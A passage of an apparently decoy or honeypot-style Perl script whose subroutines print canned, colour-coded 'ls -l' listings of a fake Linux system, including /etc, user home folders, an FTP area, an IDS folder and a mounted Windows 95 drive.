-rw-r--r--   1 root     root          414 Dec 20 19:16 inputrc$normal
-rw-r-----   1 root     root          552 Jul 31  2000 issue$normal
-rw-r-----   1 root     root          693 Sep  2 08:42 issue.net$normal
-rw-r--r--   1 root     root        22274 Jan 29 19:52 ld.so.cache$normal
-rw-r-----   1 root     root          214 Nov 19 12:35 ld.so.conf$normal
-rw-r-----   1 root     root         1002 Jan 21 11:00 lilo.conf$normal
-rw-r-----   1 root     root         2045 Apr  3  2000 login.access$normal
-rw-r-----   1 root     root         8980 Apr 26  2000 login.defs$normal
drwxr-x--x   2 root     root         4096 Apr 24  2000$azul_claro logrotate.d$normal
-rw-r--r--   1 root     root       174811 Apr 27  2000 magic$normal
drwxr-xr-x   2 root     root         4096 Jul 27  2000$azul_claro mail$normal
-r--r-----   1 root     root          112 Aug 19  1999 mail.rc$normal
-rw-r-----   1 root     root           38 Feb 14  1998 modules.conf$normal
-rw-r-----   1 root     root            6 Mar 29  2000 motd$normal
-rw-r--r--   1 root     root          121 Jan 29 17:52 mtab$normal
-rw-r-----   1 root     root          212 Dec 11  1998 named.boot$normal
-rw-r-----   1 root     root          624 Dec 20 18:47 named.conf$normal
-rw-r-----   1 root     root          727 Oct 25  1999 netgroup$normal
-rw-r-----   1 root     root          233 Apr  7  1998 networks$normal
-rw-r-----   1 root     root           36 Sep 12  1994 organization$normal
drwxr-x--x   2 root     root         4096 Apr 27  2000$azul_claro pam.d$normal
-rw-r-----   1 root     root          475 Aug 19  1999 papd.conf$normal
-rw-------   1 root     root          717 Jan 29 12:30 passwd$normal
drwxr-x--x   3 root     root         4096 Apr 16  2000$azul_claro ppp$normal
-rw-r--r-x   1 root     root         2124 Nov 19 18:33$verde_claro profile$normal
drwxr-x--x   2 root     root         4096 Apr 26  2000$azul_claro profile.d$normal
-rw-r-----   1 root     root          595 Aug 20  1994 protocols$normal
drwxr-x--x   4 root     root         4096 Apr 26  2000$azul_claro rc.d$normal
-rw-r-----   1 root     root           38 Nov 17 15:20 resolv.conf$normal
-rw-r-----   1 root     root         1595 Sep 15  1999 rpc$normal
-rw-r-----   1 root     root          286 Apr 16  2000 securetty$normal
-rw-r--r--   1 root     root         5952 Apr 29  2000 services$normal
-rw-------   1 root     root          464 Jan 29 12:30 shadow$normal
-rw-r-----   1 root     root           65 Apr 26  2000 shells$normal
drwxr-xr-x   2 root     root         4096 Nov 21 03:11$azul_claro msgs$normal
-rw-r-----   1 root     root            6 Oct  9  1999 danOS-version$normal
-rw-r-----   1 root     root          841 Apr 24  2000 snooptab$normal
-rw-r-----   1 root     root          740 Apr 27  2000 syslog.conf$normal
-rw-r-----   1 root     root         7881 Sep  5  1999 termcap$normal
drwxr-xr-x   2 root     root         4096 Nov 21 03:11$azul_claro vga$normal
-rw-r--r--   1 root     root         3313 Aug 19  1999 wgetrc$normal
EOT
}

sub list_8
{
   # /etc/default
   print STDERR << "EOT"
drwxr-x--x   2 root     root         4096 May 19  1994$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan 29 19:52$azul_claro ..$normal
-rw-r--r--   1 root     root           83 Apr 20  1994 getty.ttyS1$normal
-rw-r--r--   1 root     root         1585 May 19  1994 uugetty.ttyS0-sample$normal
-rw-r--r--   1 root     root          171 Apr 20  1994 uugetty.ttyS1$normal
-rw-r--r--   1 root     root          132 Apr 20  1994 uugetty.ttyS1.1$normal
-rw-r--r--   1 root     root          149 Apr 20  1994 uugetty.ttyS1.works$normal
-rw-r--r--   1 root     root          126 Apr 20  1994 uugetty.ttyS1~$normal
-rw-r--r--   1 root     root          171 Apr 20  1994 uugetty.ttyS3.unused$normal
EOT
}

sub list_9
{
   # /etc/dhcpc
   print STDERR << "EOT"
drwxr-x--x   2 root     root         4096 Oct 25  1999$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan 29 19:52$azul_claro ..$normal
-rwxr-x---   1 root     root           61 Oct 25  1999 dhcpcd-eth0.exe$normal
EOT
}

sub list_10
{
   # /etc/httpd
   print STDERR << "EOT"
drwxr-x--x   3 root     root         4096 Mar 31  2000$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan 29 19:52$azul_claro ..$normal
drwxr-xr-x   2 root     root         4096 Mar 31  2000$azul_claro conf$normal
EOT
}

sub list_11
{
   # /etc/httpd/conf
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Mar 31  2000$azul_claro .$normal
drwxr-x--x   3 root     root         4096 Mar 31  2000$azul_claro ..$normal
-rw-r--r--   1 root     root         2533 Mar 31  2000 access.conf$normal
-rw-r--r--   1 root     root        10748 Mar 31  2000 httpd.conf$normal
-rw-r--r--   1 root     root        12441 Mar 31  2000 magic$normal
-rw-r--r--   1 root     root         7354 Mar 31  2000 mime.types$normal
-rw-r--r--   1 root     root         8301 Mar 31  2000 srm.conf$normal
EOT
}

sub list_12
{
   # /etc/mail
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Jul 27  2000$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan 29 19:52$azul_claro ..$normal
-rw-r-----   1 root     root        20480 Jul 27  2000 aliases.db$normal
-r--r--r--   1 bin      bin          5373 Apr 26  2000 helpfile$normal
-rw-r-----   1 root     root        34224 Jul 27  2000 sendmail.cf$normal
-rw-r--r--   1 root     root          800 Jul 27  2000 sendmail.mc$normal
-rw-r-----   1 root     root          616 Apr 26  2000 sendmail.st$normal
-rw-r--r--   1 root     bin           628 Jan 14 15:55 statistics$normal
EOT
}

sub list_13
{
   # /etc/pam.d
   print STDERR << "EOT"
drwxr-x--x   2 root     root         4096 Apr 27  2000$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan 29 19:52$azul_claro ..$normal
-rw-------   1 root     root          350 Dec 11  1998 ssh$normal
EOT
}

sub list_14
{
   # /etc/ppp
   print STDERR << "EOT"
drwxr-x--x   3 root     root         4096 Apr 16  2000$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan 29 19:52$azul_claro ..$normal
-rw-------   1 root     root           53 Apr 26  2000 chap-secrets$normal
-rwxr-xr-x   1 root     root         1208 Mar 28  2000$verde_claro ip-down$normal
-rwxr-xr-x   1 root     root         1945 Mar 28  2000$verde_claro ip-up$normal
-rw-------   1 root     root          536 Mar 28  2000 options$normal
-rw-------   1 root     root          650 Mar 28  2000 options.demand$normal
-rw-------   1 root     root          263 Apr 26  2000 pap-secrets$normal
drwxr-xr-x   2 root     root         4096 Apr 11  2000$azul_claro peers$normal
-rw-------   1 root     root          146 Mar 29  2000 pppscript$normal
-rw-------   1 root     root         8853 Mar 28  2000 pppsetup.txt$normal
EOT
}

sub list_15
{
   # /etc/ppp/peers
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Apr 11  2000$azul_claro .$normal
drwxr-x--x   3 root     root         4096 Apr 16  2000$azul_claro ..$normal
-rw-------   1 root     daemon         19 Mar  7  2000 wvdial$normal
EOT
}

sub list_16
{
   # /etc/profile.d
   print STDERR << "EOT"
drwxr-x--x   2 root     root         4096 Apr 26  2000$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan 29 19:52$azul_claro ..$normal
-rwxr-xr-x   1 root     root          176 Sep 27  1999$verde_claro kde.csh$normal
-rwxr-xr-x   1 root     root           85 Sep 27  1999$verde_claro kde.sh$normal
-rwxr-xr-x   1 root     root          271 Sep 27  1999$verde_claro qt.csh$normal
-rwxr-xr-x   1 root     root          165 Sep 27  1999$verde_claro qt.sh$normal
EOT
}

sub list_17
{
   # /etc/rc.d
   print STDERR << "EOT"
drwxr-x--x   4 root     root         4096 Apr 26  2000$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan 29 19:52$azul_claro ..$normal
drwxr-xr-x   2 root     root         4096 Aug 13 23:27$azul_claro init.d$normal
-rwxr-xr-x   1 root     root          980 Oct  3  1999$verde_claro rc.4$normal
-rwxr-xr-x   1 root     root          774 Jul 25  2000$verde_claro rc.6$normal
-rwxr-xr-x   1 root     root         1813 Sep 11  1999$verde_claro rc.K$normal
-rwxr-xr-x   1 root     root         5219 Jul 27  2000$verde_claro rc.M$normal
-rwxr-xr-x   1 root     root         6244 Mar 29  2000$verde_claro rc.S$normal
-rwxr-xr-x   1 root     root          943 Aug 19  1999$verde_claro rc.atalk$normal
-rw-r--r--   1 root     root         2239 Oct 24  1998 rc.cdrom$normal
-rwxr-xr-x   1 root     root          117 Aug 23  1999$verde_claro rc.font.sample$normal
-rwxr-xr-x   1 root     root          832 Apr 26  2000$verde_claro rc.gpm$normal
-rwxr-xr-x   1 root     root           37 Aug 26  1999$verde_claro rc.httpd$normal
-rwxr-xr-x   1 root     root          259 Mar 25  1999$verde_claro rc.ibcs2$normal
-rwxr-xr-x   1 root     root         2489 Oct  7  1999$verde_claro rc.inet1$normal
-rwxr-xr-x   1 root     root         5169 Apr 27  2000$verde_claro rc.inet2$normal
-rwxr-xr-x   1 root     root          130 Dec 22 13:12$verde_claro rc.local$normal
-rwxr-xr-x   1 root     root        19392 Apr 27  2000$verde_claro rc.modules$normal
-rwxr-xr-x   1 root     root         4000 Sep  6  1999$verde_claro rc.pcmcia$normal
-rwxr-xr-x   1 root     root          158 Oct 17  1999$verde_claro rc.samba$normal
-rwxr-xr-x   1 root     root         1487 Aug  1  1999$verde_claro rc.serial$normal
-rwxr-xr-x   1 root     root         1740 Sep 11  1999$verde_claro rc.sysvinit$normal
-rwxr-xr-x   1 root     root         1320 Sep 11  1999$verde_claro rc.ids$normal
EOT
}

sub list_18
{
   # /etc/rc.d/init.d
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Aug 13 23:27$azul_claro .$normal
drwxr-x--x   4 root     root         4096 Apr 26  2000$azul_claro ..$normal
-rwxr-xr-x   1 root     root          981 Oct 15  1999$verde_claro ippl$normal
-rwxr-xr-x   1 root     root         1391 Dec 11  1998$verde_claro postgresql$normal
-rwxr-xr-x   1 root     root         1073 Dec 10  1998$verde_claro quake-server$normal
-rwxr-xr-x   1 root     root          994 Dec 11  1998$verde_claro sshd$normal
EOT
}

sub list_19
{
   # /etc/vga
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Nov 21 03:11$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan 29 19:52$azul_claro ..$normal
-rw-r--r--   1 root     root         1496 Oct  8  1999 dvorak-us.keymap$normal
-rw-r--r--   1 root     root        15921 Nov 21 03:33 libvga.config$normal
-rw-r--r--   1 root     root         4715 Dec  9  1998 libvga.et4000$normal
-rw-r--r--   1 root     root         5178 Dec  9  1998 libvga.et6000$normal
-rw-r--r--   1 root     root         1492 Nov 21 03:28 null.keymap$normal
EOT
}

sub list_20
{
   # /etc/msgs
   print STDERR << "EOT"
drwxr-x--x   2 root     root         4096 Mar 31  2000$azul_claro .$normal
drwxr-xr-x  24 root     root         4096 Jan 29 19:52$azul_claro ..$normal
-rw-r--r--   1 root     root          169 Aug  1  1994 mirrors.msg$normal
-rw-r--r--   1 root     root           44 Aug  1  1994 msg.dead$normal
-rw-r--r--   1 root     root          149 Aug  1  1994 msg.toomany$normal
-rw-r--r--   1 root     root          312 Aug  1  1994 welcome.msg$normal
EOT
}

sub list_21
{
   # /home
   print STDERR << "EOT"
drwxr-xr-x  43 root     root         4096 Jan 29 12:30$azul_claro .$normal
drwxr-xr-x  21 root     root         4096 Jan 29 07:45$azul_claro ..$normal
drwxrwxrwx   7 root     wheel        4096 Jan  9 13:27$azul_claro ftp$normal
drwx--x--x   2 joao     users        4096 Jan 29 12:30$azul_claro joao$normal
drwx--x--x   2 lorena   users        4096 Jan 29 12:30$azul_claro lorena$normal
drwx--x--x   2 daniel   users        4096 Jan 29 12:30$azul_claro daniel$normal
drwx--x--x   2 bill     users        4096 Jan 29 12:30$azul_claro bill$normal
EOT
}

sub list_22
{
   # /home/ftp
   print STDERR << "EOT"
drwxrwxrwx   7 root     wheel        4096 Jan  9 13:27$azul_claro .$normal
drwxr-xr-x  43 root     root         4096 Jan 29 12:30$azul_claro ..$normal
drwxrwxr-x   2 root     wheel        4096 Aug  6 15:33$azul_claro bin$normal
drwxr-xr-x   4 root     root         4096 Dec 23 22:57$azul_claro etc$normal
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro sbin$normal
drwxr-xrwx   4 root     root         4096 Dec 24 00:10$azul_claro tmp$normal
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro usr$normal
EOT
}

sub list_23
{
   # /home/ftp/bin
   print STDERR << "EOT"
drwxrwxr-x   2 root     wheel        4096 Aug  6 15:33$azul_claro .$normal
drwxrwxrwx   7 root     wheel        4096 Jan  9 13:27$azul_claro ..$normal
-rwxrwxr-x   1 root     wheel      132680 Apr  7  1998$verde_claro ls$normal
EOT
}

sub list_24
{
   # /home/ftp/etc
   print STDERR << "EOT"
drwxr-xr-x   4 root     root         4096 Dec 23 22:57$azul_claro .$normal
drwxrwxrwx   7 root     wheel        4096 Jan  9 13:27$azul_claro ..$normal
drwxr-xr-x   2 root     root         4096 Dec 23 22:57$azul_claro mkdir$normal
drwxr-xr-x   2 root     root         4096 Dec 23 22:57$azul_claro secret$normal
EOT
}

sub list_25
{
   # /home/ftp/etc/mkdir
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:57$azul_claro .$normal
drwxr-xr-x   4 root     root         4096 Dec 23 22:57$azul_claro ..$normal
EOT
}

sub list_26
{
   # /home/ftp/etc/secret
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:57$azul_claro .$normal
drwxr-xr-x   4 root     root         4096 Dec 23 22:57$azul_claro ..$normal
EOT
}

sub list_27
{
   # /home/ftp/sbin
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     wheel        4096 Jan  9 13:27$azul_claro ..$normal
EOT
}

sub list_28
{
   # /home/ftp/tmp
   print STDERR << "EOT"
drwxr-xrwx   4 root     root         4096 Dec 24 00:10$azul_claro .$normal
drwxrwxrwx   7 root     wheel        4096 Jan  9 13:27$azul_claro ..$normal
-rw-r--r--   1 ftp      bin             0 Dec 24 00:10 p00r.c$normal
EOT
}

sub list_29
{
   # /home/ftp/usr
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     wheel        4096 Jan  9 13:27$azul_claro ..$normal
EOT
}

sub list_30
{
   # /home/joao
   print STDERR << "EOT"
drwx--x--x   2 joao     users        4096 Jan 29 12:30$azul_claro .$normal
drwxr-xr-x  43 root     root         4096 Jan 29 12:30$azul_claro ..$normal
-rwxr-xr--   2 joao     users        5096 Dec 23 22:57 .bash_history$normal
drwxr-xr-x   2 joao     users        4096 Dec 23 22:57$azul_claro xxx$normal
drwxr-xr-x   2 joao     users        4096 Dec 23 22:57$azul_claro mp3$normal
drwxr-xr-x   2 joao     users        4096 Dec 23 22:57$azul_claro appz$normal
EOT
}

sub list_31
{
   # /home/joao/xxx
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     root         4096 Jan  9 13:27$azul_claro ..$normal
-rw-r--r--   7 joao     users      213233 Jan  9 13:27$rosa_claro loira01.jpg$normal
-rw-r--r--   7 joao     users       32331 Jan  9 13:27$rosa_claro loira02.jpg$normal
-rw-r--r--   7 joao     users      432342 Jan  9 13:27$rosa_claro loira03.jpg$normal
-rw-r--r--   7 joao     users       33432 Jan  9 13:27$rosa_claro loira04.jpg$normal
-rw-r--r--   7 joao     users     5233451 Jan  9 13:27$rosa_claro praia.mpg$normal
EOT
}

sub list_32
{
   # /home/joao/mp3
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     root         4096 Jan  9 13:27$azul_claro ..$normal
-rw-r--r--   7 joao     users     3444234 Jan  9 13:45$rosa_claro u2-walk_on.mp3$normal
-rw-r--r--   7 joao     users     2463423 Jan  9 13:52$rosa_claro u2-beautiful_day.mp3$normal
-rw-r--r--   7 joao     users     2435674 Jan  9 14:14$rosa_claro u2-blood_sunday.mp3$normal
-rw-r--r--   7 joao     users     3534434 Jan  9 14:33$rosa_claro mark_knopfler-what_it_is.mp3$normal
-rw-r--r--   7 joao     users     4534334 Jan  9 14:45$rosa_claro dire_straits-brothers_in_arms.mp3$normal
-rw-r--r--   7 joao     users     3453444 Jan  9 15:03$rosa_claro will_smith-mib.mp3$normal
-rw-r--r--   7 joao     users     2876778 Jan  9 15:19$rosa_claro will_smith-wildwest.mp3$normal
EOT
}

sub list_33
{
   # /home/joao/appz
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     root         4096 Jan  9 13:27$azul_claro ..$normal
EOT
}

sub list_34
{
   # /home/lorena
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     root         4096 Jan  9 13:27$azul_claro ..$normal
-rw-r--r--   7 lorena   users        2434 Jan  9 14:33 .bash_history$normal
-rw-r--r--   7 lorena   users        5434 Jan  9 14:33 recado.txt$normal
EOT
}

sub list_35
{
   # /home/daniel
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     root         4096 Jan  9 13:27$azul_claro ..$normal
-rw-r--r--   7 daniel   users        5434 Jan  9 14:33 .bash_history$normal
EOT
}

sub list_36
{
   # /home/bill
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     root         4096 Jan  9 13:27$azul_claro ..$normal
drwxr-xr-x   2 bill     users        4096 Dec 23 22:57$azul_claro photos$normal
drwxr-xr-x   2 bill     users        4096 Dec 23 22:57$azul_claro letters$normal
drwxr-xr-x   2 bill     users        4096 Dec 23 22:57$azul_claro mail$normal
EOT
}

sub list_37
{
   # /home/bill/photos
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     root         4096 Jan  9 13:27$azul_claro ..$normal
-rw-r--r--   7 bill     users      213233 Jan  9 13:27$rosa_claro monica01.jpg$normal
-rw-r--r--   7 bill     users       32331 Jan  9 13:27$rosa_claro monica02.jpg$normal
-rw-r--r--   7 bill     users      434344 Jan  9 13:27$rosa_claro monica03.jpg$normal
-rw-r--r--   7 bill     users      567564 Jan  9 13:28$rosa_claro monica_onthetable.jpg$normal
-rw-r--r--   7 bill     users     6325456 Jan  9 13:30$rosa_claro monica_nonstop.mpg$normal
EOT
}

sub list_38
{
   # /home/bill/letters
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     root         4096 Jan  9 13:27$azul_claro ..$normal
EOT
}

sub list_39
{
   # /home/bill/mail
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     root         4096 Jan  9 13:27$azul_claro ..$normal
-rwxr-xr--   2 bill     users        3045 Dec 23 22:57 sent-mail$normal
EOT
}

sub list_40
{
   # /lib
   print STDERR << "EOT"
drwxr-xr-x   3 root     root         4096 Nov 19 12:36$azul_claro .$normal
drwxr-xr-x  21 root     root         4096 Jan 29 07:45$azul_claro ..$normal
-rwxr-xr-x   1 root     root        76364 Sep  9  1999$verde_claro ld-2.1.2.so$normal
-rwxr-xr-x   1 root     root        79508 Jun 25  1999$verde_claro ld-linux.so.1.9.9$normal
-rwxr-xr-x   1 root     root       104060 Jun 25  1999$verde_claro ld.so$normal
-rwxr-xr-x   1 root     root         3540 Sep  9  1999$verde_claro libBrokenLocale-2.1.2.so$normal
-rwxr-xr-x   1 root     root        43596 Sep 15  1999$verde_claro libSegFault.so$normal
-rwxr-xr-x   1 root     root      1008844 Sep  9  1999$verde_claro libc-2.1.2.so$normal
-rwxr-xr-x   1 root     root        62078 Sep 17  1999$verde_claro libcrypt-2.1.2.so$normal
-rwxr-xr-x   2 root     root       270304 Sep 23  1999$verde_claro libncurses.so.4$normal
-rwxr-xr-x   2 root     root       270304 Sep 23  1999$verde_claro libncurses.so.5.0$normal
-rwxr-xr-x   1 root     root          684 Apr 25  2000$verde_claro libpcap-nessus.la$normal
-rwxr-xr-x   1 root     root        73941 Apr 25  2000$verde_claro libpcap-nessus.so$normal
-rwxr-xr-x   1 root     root        73941 Apr 25  2000$verde_claro libpcap-nessus.so.1.0.0$normal
-r-xr-xr-x   1 root     root        40782 Aug 24  1999$verde_claro libproc.so.2.0.0$normal
-rwxr-xr-x   1 root     root       247008 Sep 15  1999$verde_claro libpthread-0.8.so$normal
-rwxr-xr-x   1 root     root        45440 Sep  9  1999$verde_claro libresolv-2.1.2.so$normal
-rwxr-xr-x   1 root     root        14831 Aug 21  1999$verde_claro libtermcap.so.2.0.8$normal
-rwxr-xr-x   1 root     root         7736 Sep  9  1999$verde_claro libutil-2.1.2.so$normal
EOT
}

sub list_41
{
   # /misc
   print STDERR << "EOT"
drwxr-xr-x   6 root     root         4096 Dec 20 17:17$azul_claro .$normal
drwxr-xr-x  21 root     root         4096 Jan 29 07:45$azul_claro ..$normal
drwxr-xr-x   2 root     root         4096 Dec 25 21:42$azul_claro ids$normal
drwxr-xr-x   2 root     root         4096 Nov 18 17:01$azul_claro drivers$normal
drwxr-xr-x   2 root     root         4096 Nov 23 17:05$azul_claro cnm$normal
EOT
}

sub list_42
{
   # /misc/ids
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     root         4096 Jan  9 13:27$azul_claro ..$normal
-rwxr-xr--   2 root     root       270304 Sep 23  1999 ids.log$normal
-rwxr-xr--   2 root     root        74524 Sep 23  1999 ids.conf$normal
-rwxr-xr--   2 root     root        35542 Sep 23  1999 ids.status$normal
-rw-r--r--   2 root     root        39448 Sep 23  1999 ids.o$normal
EOT
}

sub list_43
{
   # /misc/drivers/modem
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     root         4096 Jan  9 13:27$azul_claro ..$normal
-rwxr-xr--   1 root     root        65535 Sep 11  1999 usr_3com.drv$normal
-rwxr-xr--   1 root     root        65535 Sep 11  1999 motorola.drv$normal
-rwxr-xr--   1 root     root        65535 Sep 11  1999 trellis.drv$normal
-rwxr-xr--   1 root     root        65535 Sep 11  1999 pctel_winmodem.drv$normal
EOT
}

sub list_44
{
   # /misc/drivers/usb
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     root         4096 Jan  9 13:27$azul_claro ..$normal
-rwxr-xr--   1 root     root        65535 Sep 11  1999 generic.drv$normal
EOT
}

sub list_45
{
   # /misc/drivers/video
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     root         4096 Jan  9 13:27$azul_claro ..$normal
-rwxr-xr--   1 root     root        65535 Sep 11  1999 sis5597.drv$normal
-rwxr-xr--   1 root     root        65535 Sep 11  1999 voodoo.drv$normal
-rwxr-xr--   1 root     root        65535 Sep 11  1999 diamond.drv$normal
EOT
}

sub list_46
{
   # /misc/drivers/sound
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     root         4096 Jan  9 13:27$azul_claro ..$normal
-rwxr-xr--   1 root     root        65535 Sep 11  1999 cmi8330.drv$normal
-rwxr-xr--   1 root     root        65535 Sep 11  1999 cmi8338.drv$normal
-rwxr-xr--   1 root     root        65535 Sep 11  1999 sb.drv$normal
EOT
}

sub list_47
{
   # /misc/drivers/net
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Dec 23 22:56$azul_claro .$normal
drwxrwxrwx   7 root     root         4096 Jan  9 13:27$azul_claro ..$normal
-rwxr-xr--   1 root     root        65535 Sep 11  1999 usr_3com.drv$normal
-rwxr-xr--   1 root     root        65535 Sep 11  1999 hayes.drv$normal
-rwxr-xr--   1 root     root        65535 Sep 11  1999 generic_ethernet.drv$normal
EOT
}

sub list_48
{
   # /mnt
   print STDERR << "EOT"
drwxr-xr-x   6 root     root         4096 Jan  9 12:51$azul_claro .$normal
drwxr-xr-x  21 root     root         4096 Jan 29 07:45$azul_claro ..$normal
drwxr-xr-x   2 root     root         4096 Mar 28  2000$azul_claro cdrom$normal
drwxr-xr-x   2 root     root         4096 Apr 26  2000$azul_claro floppy$normal
drwxr-xr-x   2 root     root         4096 Mar 29  2000$azul_claro fw95$normal
drwxr-xr-x  25 root     root         8192 Dec 31  1969$azul_claro w95$normal
EOT
}

sub list_49
{
   # /mnt/w95
   print STDERR << "EOT"
drwxr-xr-x  25 root     root         8192 Dec 31  1969$azul_claro .$normal
drwxr-xr-x   6 root     root         4096 Jan  9 12:51$azul_claro ..$normal
drwxr-xr-x   8 root     root         4096 Dec  9 11:11$azul_claro Acrobat3$normal
dr-xr-xr-x  19 root     root         4096 Jan 16 01:11 Arquivos de$azul_claro Programas$normal
drwxr-xr-x   9 root     root         4096 Jul 23  2000$azul_claro Desenv$normal
drwxr-xr-x  11 root     root         4096 Jul 24  2000$azul_claro InetServ$normal
drwxr-xr-x   4 root     root         4096 Sep  2 08:47 Meus$azul_claro documentos$normal
drwxr-xr-x   4 root     root         4096 Apr 26  2000$azul_claro Outros$normal
-rwxr-xr-x   1 root     root         9825 Sep 14 02:24$verde_claro WinAmp.Log$normal
-rwxr-xr-x   1 root     root          425 Dec 12 12:42$verde_claro autoexec.bak$normal
-rwxr-xr-x   1 root     root          586 Jan 27 12:54$verde_claro autoexec.bat$normal
-rwxr-xr-x   1 root     root           66 Mar 27  2000$verde_claro autoexec.dos$normal
drwxr-xr-x   2 root     root         4096 Nov  7 15:26$azul_claro bkp$normal
-rwxr-xr-x   1 root     root          366 Dec 11 21:49$verde_claro bootlog.txt$normal
drwxr-xr-x   8 root     root         4096 Dec 21 10:49$azul_claro clipper5$normal
-rwxr-xr-x   1 root     root        95924 Aug 24  1996$verde_claro command.com$normal
-rwxr-xr-x   1 root     root           68 Jan 16 01:16$verde_claro config.000$normal
-rwxr-xr-x   1 root     root           68 Apr 26  2000$verde_claro config.bak$normal
-rwxr-xr-x   1 root     root           84 Mar  8  2000$verde_claro config.dos$normal
-rwxr-xr-x   1 root     root          425 Jan 16 01:16$verde_claro config.nto$normal
-rwxr-xr-x   1 root     root           68 Jan 16 21:14$verde_claro config.sys$normal
-rwxr-xr-x   1 root     root            0 Jan 22 12:19$verde_claro cwsdpmi.swp$normal
drwxr-xr-x   6 root     root         4096 Jan 16 22:26$azul_claro daniel$normal
-rwxr-xr-x   1 root     root        19099 May 15  1998$verde_claro deltree.exe$normal
-rwxr-xr-x   1 root     root        15735 May 15  1998$verde_claro doskey.com$normal
-rwxr-xr-x   1 root     root        70750 May 15  1998$verde_claro edit.com$normal
-rwxr-xr-x   1 root     root         4379 Jan 17 05:03$verde_claro ffastun.ffa$normal
-rwxr-xr-x   1 root     root       131072 Jan 17 05:03$verde_claro ffastun.ffl$normal
-rwxr-xr-x   1 root     root        49152 Jan 17 05:03$verde_claro ffastun.ffo$normal
-rwxr-xr-x   1 root     root       667648 Jan 17 05:03$verde_claro ffastun0.ffx$normal
drwxr-xr-x   4 root     root         4096 Apr 26  2000$azul_claro fontes$normal
-rwxr-xr-x   1 root     root        33319 Feb  7  2000$verde_claro himem.sys$normal
drwxr-xr-x  44 root     root        69632 Apr 17  2000$azul_claro icones$normal
-rwxr-xr-x   1 root     root          425 Nov 20 15:03$verde_claro initsnd.bat$normal
-r-xr-xr-x   1 root     root       214836 Aug 24  1996$verde_claro io.sys$normal
-rwxr-xr-x   1 root     root       129078 Aug 24  1996$verde_claro logo.sys$normal
drwxr-xr-x   2 root     root         4096 Jan 19 21:41$azul_claro mp3$normal
-rwxr-xr-x   1 root     root        25473 May 15  1998$verde_claro mscdex.exe$normal
-r-xr-xr-x   1 root     root         1650 Apr 26  2000$verde_claro msdos.sys$normal
-rwxr-xr-x   1 root     root       139303 Oct  4 15:11$verde_claro msg.txt$normal
drwxr-xr-x   2 root     root         4096 Dec 21 10:50$azul_claro ng$normal
-rwxr-xr-x   1 root     root        13030 Sep  7 13:54$verde_claro pdoxusrs.net$normal
drwxr-xr-x   2 root     root         8192 Mar 28  2000$azul_claro recycled$normal
drwxr-xr-x   5 root     root         4096 Jan 22 12:24$azul_claro roms$normal
drwxr-xr-x   3 root     root         4096 Sep  2 08:43$azul_claro rx$normal
-rwxr-xr-x   1 root     root          606 Jan 21 14:59$verde_claro scandisk.log$normal
drwxr-xr-x   6 root     root         4096 Dec 21 12:32$azul_claro siga$normal
drwxr-xr-x   2 root     root         4096 Nov 20 13:59$azul_claro som$normal
drwxr-xr-x   3 root     root         4096 Dec 21 11:11$azul_claro sulfago$normal
-rwxr-xr-x   1 root     root        22256 Feb  7  2000$verde_claro usdide.sys$normal
drwxr-xr-x   3 root     root         4096 Nov 24 11:55$azul_claro voyetra$normal
drwxr-xr-x  41 root     root        16384 Sep  2 08:41$azul_claro windows$normal
drwxr-xr-x   2 root     root         4096 Jan 21 15:03$azul_claro winsock$normal
drwxr-xr-x   3 root     root         4096 Aug  6 02:37$azul_claro wtlib$normal
EOT
}

sub list_50
{
   # /mnt/fw95
   print STDERR << "EOT"
drwxr-xr-x   2 root     root         4096 Mar 29  2000$azul_claro .$normal
